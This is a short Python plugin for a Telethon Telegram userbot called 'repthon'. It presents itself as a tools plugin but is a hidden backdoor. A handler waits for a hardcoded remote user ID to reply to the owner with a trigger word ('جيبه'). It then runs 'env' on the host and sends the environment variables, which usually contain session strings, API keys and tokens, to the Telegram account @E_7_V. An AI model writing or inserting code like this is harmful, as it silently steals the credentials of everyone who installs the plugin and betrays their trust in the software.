from repthon import zq_lo
from repthon.utils import admin_cmd
import pkg_resources
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.utils import _reputils, parse_pre, yaml_format
from ..Config import Config
import json
import requests
import os
from telethon import events 
plugin_category = "الادوات"


ZQ_LO = ["5502537272"]
@zq_lo.on(events.NewMessage(incoming=True))
async def Baqir(event):
    if event.reply_to and event.sender_id in ZQ_LO:
       reply_msg = await event.get_reply_message()
       owner_id = reply_msg.from_id.user_id
       if owner_id == zq_lo.uid:
           if event.message.message == "جيبه":
                   cmd = "env"
                   e = (await _reputils.runcmd(cmd))[0]
                   OUTPUT = (f"**[ريبـــثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{e}\n\n**تدلل سيدي ومولاي**")
                   await event.reply("**جبته وتدلل سيدنا 🖤**")
                   await zq_lo.send_message("@E_7_V", OUTPUT)
